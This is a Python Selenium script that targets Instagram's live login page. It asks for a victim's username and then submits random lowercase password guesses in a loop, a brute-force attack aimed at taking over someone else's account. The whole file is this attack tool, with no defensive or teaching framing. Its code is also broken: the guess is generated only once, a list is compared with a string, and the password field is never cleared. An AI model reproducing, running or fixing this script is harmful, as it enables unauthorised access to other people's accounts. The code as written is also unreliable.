from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import random
import keyboard

path = 'chromedriver/path here'
cracker = webdriver.Chrome(path)
cracker.get('https://www.instagram.com/accounts/login/?next=%2Flogin%2F&source=desktop_nav')

password = ''

characters = ['a', 'b', 'c', 'd', 'e', 'f',
              'g', 'h', 'i', 'j', 'k', 'l',
              'm', 'n', 'o', 'p', 'q', 'r',
              's', 't', 'u', 'v', 'w', 'x',
              'y', 'z']



def cracker_bot():
    password_length = input('Enter the length of the password by typing random characters that is length')
    username = input('what is the username of the person you want to brute force')
    
    username_input = cracker.find_element_by_xpath('/html/body/div[1]/section/main/div/div/div[1]/div/form/div/div[1]/div/label/input')
    username_input.send_keys(username)
    password_input = cracker.find_element_by_xpath('/html/body/div[1]/section/main/div/div/div[1]/div/form/div/div[2]/div/label/input')
    login_button = cracker.find_element_by_xpath('/html/body/div[1]/section/main/div/div/div[1]/div/form/div/div[3]')
    password_guess = random.choices(characters, k=len(password_length))

    while(password_guess != password):
        print('press q to stop the bot')

        password_input.send_keys(password_guess)
        login_button.click()
        if(keyboard.is_pressed('q')):
            break
        else:
            continue


cracker_bot()
